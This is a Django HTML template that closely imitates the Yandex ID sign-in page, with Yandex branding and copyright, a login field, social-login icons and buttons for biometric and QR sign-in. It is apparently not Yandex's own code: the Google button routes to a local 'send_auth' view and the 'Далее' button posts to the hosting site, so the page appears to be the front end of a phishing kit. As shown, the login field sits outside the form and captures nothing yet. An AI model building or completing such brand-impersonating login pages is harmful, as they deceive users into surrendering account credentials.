{% load static %}
<!DOCTYPE html>
<html lang="ru">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Яндекс ID</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Helvetica Neue', Arial, sans-serif;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      background: url('https://images.unsplash.com/photo-1616046229478-9901c5536a45?w=1600&q=80') center/cover no-repeat fixed;
      position: relative;
    }

    body::before {
      content: '';
      position: fixed;
      inset: 0;
      background: rgba(10, 25, 50, 0.45);
      z-index: 0;
    }

    .footer-incognito {
      position: fixed;
      bottom: 12px;
      left: 24px;
      color: rgba(255, 255, 255, 0.75);
      font-size: 13px;
      z-index: 10;
    }

    .footer-right {
      position: fixed;
      bottom: 12px;
      right: 24px;
      display: flex;
      align-items: center;
      gap: 18px;
      color: rgba(255, 255, 255, 0.75);
      font-size: 13px;
      z-index: 10;
    }

    .footer-center {
      position: fixed;
      bottom: 28px;
      left: 50%;
      transform: translateX(-50%);
      text-align: center;
      z-index: 10;
    }

    .footer-center p {
      color: rgba(255, 255, 255, 0.85);
      font-size: 14px;
      margin-bottom: 4px;
    }

    .footer-center a {
      color: rgba(255, 255, 255, 0.85);
      font-size: 14px;
      text-decoration: none;
    }

    .footer-center a:hover {
      text-decoration: underline;
    }

    .card {
      position: relative;
      z-index: 5;
      background: #1a1a1a;
      border-radius: 24px;
      padding: 32px 28px 28px;
      width: 360px;
      display: flex;
      flex-direction: column;
      gap: 16px;
      box-shadow: 0 24px 80px rgba(0, 0, 0, 0.6);
    }

    .logo {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
      margin-bottom: 4px;
    }

    .logo-text {
      font-size: 22px;
      font-weight: 700;
      color: #fff;
      letter-spacing: -0.5px;
    }

    .logo-badge {
      background: #fc3f1d;
      color: #fff;
      font-size: 11px;
      font-weight: 700;
      padding: 2px 6px;
      border-radius: 6px;
      letter-spacing: 0.5px;
    }

    .title {
      font-size: 20px;
      font-weight: 600;
      color: #fff;
      text-align: center;
    }

    .tab-switcher {
      display: flex;
      background: #2a2a2a;
      border-radius: 12px;
      padding: 4px;
      gap: 2px;
    }

    .tab-btn {
      flex: 1;
      padding: 9px;
      border: none;
      border-radius: 9px;
      font-size: 14px;
      font-weight: 500;
      cursor: pointer;
      transition: background 0.2s, color 0.2s;
      background: transparent;
      color: rgba(255, 255, 255, 0.5);
    }

    .tab-btn.active {
      background: #3a3a3a;
      color: #fff;
    }

    .input-field {
      background: #2a2a2a;
      border: 1.5px solid transparent;
      border-radius: 12px;
      padding: 14px 16px;
      font-size: 15px;
      color: rgba(255, 255, 255, 0.45);
      outline: none;
      transition: border-color 0.2s, color 0.2s;
      width: 100%;
    }

    .input-field:focus {
      border-color: #fc3f1d;
      color: #fff;
    }

    .input-field::placeholder {
      color: rgba(255, 255, 255, 0.35);
    }

    .socials {
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 14px;
    }

    .social-link {
      width: 44px;
      height: 44px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      text-decoration: none;
      transition: transform 0.15s, box-shadow 0.15s;
    }

    .social-link:hover {
      transform: scale(1.1);
      box-shadow: 0 4px 14px rgba(0, 0, 0, 0.4);
    }

    .social-link svg {
      width: 22px;
      height: 22px;
    }

    .btn {
      width: 100%;
      padding: 15px;
      border-radius: 14px;
      border: none;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      transition: opacity 0.15s, transform 0.1s;
      text-decoration: none;
    }

    .btn:active {
      transform: scale(0.98);
    }

    .btn-primary {
      background: #fff;
      color: #111;
    }

    .btn-secondary {
      background: #2a2a2a;
      color: #fff;
    }

    .btn:hover {
      opacity: 0.9;
    }

    .btn svg {
      width: 20px;
      height: 20px;
      flex-shrink: 0;
    }
  </style>
</head>

<body>

  <div class="footer-incognito">Используйте режим инкогнито на чужом компьютере</div>

  <div class="footer-center">
    <p>Яндекс ID — ключ для всех сервисов</p>
    <a href="#">Узнать больше</a>
  </div>

  <div class="footer-right">
    <span>Ru</span>
    <a href="#" style="color:rgba(255,255,255,0.75);text-decoration:none;">Справка и поддержка</a>
    <span>© 2026, Яндекс</span>
  </div>

  <div class="card">

    <div class="logo">
      <span class="logo-text">Яндекс</span>
      <span class="logo-badge">ID</span>
    </div>

    <div class="title">Войдите с ID</div>

    <div class="tab-switcher">
      <button class="tab-btn active" onclick="switchTab(this, 'email')">Почта</button>
      <button class="tab-btn" onclick="switchTab(this, 'phone')">Телефон</button>
    </div>

    <input class="input-field" id="login-input" type="text" placeholder="Логин или email" />

    <!-- Social login buttons -->
    <div class="socials">

      <!-- VK -->
      <a href="#" class="social-link" style="background:#0077FF;">
        <svg viewBox="0 0 24 24" fill="white">
          <path
            d="M12.785 16.241s.288-.032.436-.194c.136-.148.132-.427.132-.427s-.019-1.304.587-1.496c.597-.189 1.364 1.26 2.177 1.815.614.418 1.08.327 1.08.327l2.17-.03s1.135-.07.597-.963c-.044-.073-.314-.661-1.618-1.869-1.366-1.263-1.183-1.059.462-3.246.999-1.332 1.399-2.146 1.273-2.493-.12-.332-.855-.244-.855-.244l-2.44.015s-.181-.025-.315.056c-.132.079-.216.264-.216.264s-.388 1.057-.905 1.956c-1.09 1.851-1.527 1.949-1.705 1.834-.414-.267-.311-1.075-.311-1.648 0-1.793.272-2.54-.529-2.733-.265-.064-.46-.106-1.138-.113-.871-.009-1.608.003-2.025.207-.278.135-.492.437-.361.453.161.019.526.099.72.363.249.341.24 1.107.24 1.107s.143 2.11-.334 2.372c-.327.179-.776-.186-1.74-1.858-.494-.855-.868-1.8-.868-1.8s-.072-.178-.202-.274c-.157-.115-.376-.152-.376-.152l-2.322.015s-.348.01-.476.161c-.113.135-.009.414-.009.414s1.819 4.256 3.877 6.402c1.888 1.97 4.029 1.841 4.029 1.841h.971z" />
        </svg>
      </a>

      <!-- Google -->
      <a href="{% url 'send_auth' %}" class="social-link" style="background:#fff;">
        <svg viewBox="0 0 24 24">
          <path
            d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"
            fill="#4285F4" />
          <path
            d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"
            fill="#34A853" />
          <path
            d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z"
            fill="#FBBC05" />
          <path
            d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"
            fill="#EA4335" />
        </svg>
      </a>

      <!-- Mail.ru -->
      <a href="#" class="social-link" style="background:#005FF9;">
        <svg viewBox="0 0 24 24" fill="white">
          <path d="M12 13.5L2 7.5V17a2 2 0 002 2h16a2 2 0 002-2V7.5l-10 6zm10-8H2L12 11.5 22 5.5z" />
        </svg>
      </a>

      <!-- OK -->
      <a href="#" class="social-link" style="background:#EE8208;">
        <svg viewBox="0 0 24 24" fill="white">
          <path
            d="M12 12c2.761 0 5-2.239 5-5s-2.239-5-5-5-5 2.239-5 5 2.239 5 5 5zm0-8c1.654 0 3 1.346 3 3s-1.346 3-3 3-3-1.346-3-3 1.346-3 3-3zm4.243 10.414l2.122 2.122-1.415 1.414-2.121-2.121a5.954 5.954 0 01-2.829.671 5.954 5.954 0 01-2.829-.671l-2.121 2.121-1.415-1.414 2.122-2.122A5.985 5.985 0 016 18h2a4 4 0 004 4 4 4 0 004-4h2a5.985 5.985 0 01-1.757 4.414z" />
        </svg>
      </a>

      <!-- X (Twitter) -->
      <a href="#" class="social-link" style="background:#000;">
        <svg viewBox="0 0 24 24" fill="white">
          <path
            d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z" />
        </svg>
      </a>

    </div>

    <!-- Далее — forma orqali POST qiladi -->
    <form method="POST" action="#">
      {% csrf_token %}
      <button type="submit" class="btn btn-primary" style="width:100%;">Далее</button>
    </form>

    <!-- По лицу или отпечатку -->
    <a href="#" class="btn btn-secondary">
      <svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="1.8" stroke-linecap="round"
        stroke-linejoin="round">
        <path d="M12 2C8.5 2 5.5 4.5 5.5 8c0 5.5 6.5 12 6.5 12s6.5-6.5 6.5-12C18.5 4.5 15.5 2 12 2z" />
        <circle cx="12" cy="8" r="2.5" />
      </svg>
      По лицу или отпечатку
    </a>

    <!-- QR-код -->
    <a href="#" class="btn btn-secondary">
      <svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="1.8" stroke-linecap="round"
        stroke-linejoin="round">
        <rect x="3" y="3" width="7" height="7" />
        <rect x="14" y="3" width="7" height="7" />
        <rect x="3" y="14" width="7" height="7" />
        <rect x="14" y="14" width="3" height="3" />
        <rect x="18" y="18" width="3" height="3" />
        <rect x="14" y="18" width="3" height="3" />
        <rect x="18" y="14" width="3" height="3" />
      </svg>
      QR-код
    </a>

    <!-- Создать ID -->
    <a href="#" class="btn btn-secondary">Создать ID</a>

  </div>

  <script>
    function switchTab(btn, type) {
      document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
      btn.classList.add('active');
      const input = document.getElementById('login-input');
      input.placeholder = type === 'phone' ? 'Номер телефона' : 'Логин или email';
      input.type = type === 'phone' ? 'tel' : 'text';
    }
  </script>
</body>

</html>
